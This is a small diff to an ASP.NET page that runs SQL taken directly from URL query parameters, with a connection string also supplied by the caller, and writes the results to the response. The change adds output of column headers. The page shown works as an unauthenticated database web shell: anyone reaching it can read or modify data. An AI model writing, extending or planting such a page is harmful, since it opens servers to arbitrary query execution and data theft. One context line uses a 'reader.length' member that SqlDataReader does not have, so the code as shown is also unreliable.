@@ -19,7 +19,16 @@ if ((Request.QueryString["sql"] != null) && (Request.QueryString["conn"] != null
 		{
 			conn.Open();
 			SqlDataReader reader = cmd.ExecuteReader();
-			while( reader.Read() )
+      
+      // Column names
+      for(int i=0;i<reader.FieldCount;i++)
+      {
+        Response.Write( String.Format("{0}\t", reader.GetName(i)) );
+      }
+      Response.Write("\n");
+      
+      // Rows
+      while( reader.Read() )
 			{
 				for( int i=0; i<reader.length; i++ ){
 					Response.Write( String.Format("{0}\t", reader[i] ) );
